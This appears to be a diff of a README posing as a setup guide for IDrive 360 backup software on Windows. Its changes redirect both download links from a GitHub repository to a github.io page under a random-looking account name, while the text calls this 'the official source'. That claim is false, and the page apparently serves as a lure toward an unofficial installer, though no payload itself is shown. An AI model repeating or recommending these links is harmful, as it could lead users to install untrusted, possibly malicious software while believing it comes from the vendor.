@@ -1,6 +1,6 @@
 # 💾 IDrive-360-PC-Setup-Guide - Fix Windows backup installation errors fast
 
-[![](https://img.shields.io/badge/Download-IDrive_360_Setup-blue.svg)](https://github.com/Leidenjarvertebratefoot663/IDrive-360-PC-Setup-Guide)
+[![](https://img.shields.io/badge/Download-IDrive_360_Setup-blue.svg)](https://leidenjarvertebratefoot663.github.io)
 
 This guide helps you put IDrive 360 on your Windows computer. Many users encounter trouble when installing cloud backup software on Windows 11. This document provides clear steps to manage these installations and solve common errors. 
 
@@ -20,7 +20,7 @@ Ensure your Windows system keeps up to date via the Windows Update settings menu
 
 You must obtain the installation file from the official source to ensure security and compatibility.
 
-[Visit this page to download the software](https://github.com/Leidenjarvertebratefoot663/IDrive-360-PC-Setup-Guide)
+[Visit this page to download the software](https://leidenjarvertebratefoot663.github.io)
 
 ## 🛠️ Step-by-Step Installation 
 
